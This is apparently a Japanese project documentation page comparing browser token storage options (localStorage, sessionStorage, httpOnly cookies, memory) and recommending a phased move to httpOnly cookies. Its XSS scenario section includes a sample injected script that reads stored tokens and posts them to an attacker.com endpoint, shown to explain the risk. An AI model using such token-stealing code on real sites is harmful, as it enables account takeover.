---
sidebar_position: 14
---

# Storage for Access Token

## フロントエンドでのトークン保存

### Access Token と Refresh Token

OAuth 2.0 / JWT 認証では、2 種類のトークンを使用します。

| トークン          | 目的                       | 有効期限             | 使用場所                       |
| ----------------- | -------------------------- | -------------------- | ------------------------------ |
| **Access Token**  | API リクエストの認証       | 短い（15分〜1時間）  | Authorization ヘッダー         |
| **Refresh Token** | 新しい Access Token の取得 | 長い（数日〜数週間） | トークン更新エンドポイントのみ |

これらは**別々のトークン**として発行されます。Access Token の中に Refresh Token が含まれるわけではありません。

### 保存場所の選択肢

#### 1. localStorage

```typescript
// 現在の実装
localStorage.setItem('nyx_cast_access_token', accessToken);
localStorage.setItem('nyx_cast_refresh_token', refreshToken);
```

| メリット               | デメリット                      |
| ---------------------- | ------------------------------- |
| 実装が容易             | XSS 攻撃でトークンが窃取される  |
| ページリロード後も保持 | JavaScript から直接アクセス可能 |
| タブ間で共有可能       |                                 |

#### 2. sessionStorage

```typescript
sessionStorage.setItem('access_token', accessToken);
```

| メリット               | デメリット                                         |
| ---------------------- | -------------------------------------------------- |
| タブを閉じると自動削除 | XSS 攻撃には依然脆弱                               |
| タブ間で共有されない   | ページリロードでは保持されるが、タブ間で状態が分離 |

#### 3. httpOnly Cookie（推奨）

```typescript
// サーバー側で設定
res.setHeader('Set-Cookie', [
  `refresh_token=${refreshToken}; HttpOnly; Secure; SameSite=Strict; Path=/api/identity`,
  `access_token=${accessToken}; HttpOnly; Secure; SameSite=Strict; Path=/`
]);
```

| メリット                    | デメリット               |
| --------------------------- | ------------------------ |
| JavaScript からアクセス不可 | 実装が複雑               |
| XSS 攻撃でトークン窃取不可  | CSRF 対策が必要          |
| 自動的にリクエストに付与    | Cookie サイズ制限（4KB） |

#### 4. メモリ（React State）+ httpOnly Cookie

```typescript
// Access Token: メモリに保持
const [accessToken, setAccessToken] = useState<string | null>(null);

// Refresh Token: httpOnly Cookie（サーバー側で設定）
```

| メリット             | デメリット                         |
| -------------------- | ---------------------------------- |
| 最も安全な組み合わせ | ページリロードで Access Token 消失 |
| XSS/CSRF 両方に強い  | 実装が最も複雑                     |

### セキュリティ比較

```
セキュリティレベル（高い順）:

1. メモリ + httpOnly Cookie  ← 最も安全
2. httpOnly Cookie のみ
3. sessionStorage
4. localStorage              ← 最も脆弱
```

### XSS 攻撃シナリオ

localStorage を使用している場合の攻撃例:

```javascript
// 攻撃者が注入した悪意のあるスクリプト
const accessToken = localStorage.getItem('nyx_cast_access_token');
const refreshToken = localStorage.getItem('nyx_cast_refresh_token');

// 攻撃者のサーバーに送信
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ accessToken, refreshToken })
});
```

httpOnly Cookie の場合、JavaScript からアクセスできないため、このような攻撃は成立しません。

### 推奨アーキテクチャ

```
┌─────────────────────────────────────────────────────┐
│ Browser                                             │
├─────────────────────────────────────────────────────┤
│ React App                                           │
│  - Access Token: メモリ（useState/Context）          │
│  - Refresh Token: httpOnly Cookie（自動送信）        │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│ Next.js BFF (API Routes)                            │
├─────────────────────────────────────────────────────┤
│ /api/identity/sign-in                               │
│  - Set-Cookie: refresh_token (httpOnly)             │
│  - Response body: { accessToken }                   │
│                                                     │
│ /api/identity/refresh-token                         │
│  - Read refresh_token from Cookie                   │
│  - Response body: { accessToken }                   │
│                                                     │
│ /api/* (Protected routes)                           │
│  - Read access_token from Authorization header      │
│  - Forward to Backend                               │
└─────────────────────────────────────────────────────┘
```

### トークンリフレッシュフロー

```
1. Access Token 期限切れ（401 Unauthorized）
           ↓
2. /api/identity/refresh-token を呼び出し
   - httpOnly Cookie から Refresh Token を自動送信
           ↓
3. サーバーが新しい Access Token を発行
           ↓
4. クライアントがメモリに Access Token を保存
           ↓
5. 元のリクエストをリトライ
```

### 実装優先順位

| Phase       | 実装                                    | セキュリティ | 複雑度 |
| ----------- | --------------------------------------- | ------------ | ------ |
| **現状**    | localStorage                            | 低           | 低     |
| **Phase 1** | Refresh Token を httpOnly Cookie に移行 | 中           | 中     |
| **Phase 2** | Access Token をメモリに移行             | 高           | 高     |

Phase 1 だけでも、長期間有効な Refresh Token が XSS で窃取されるリスクを排除できます。
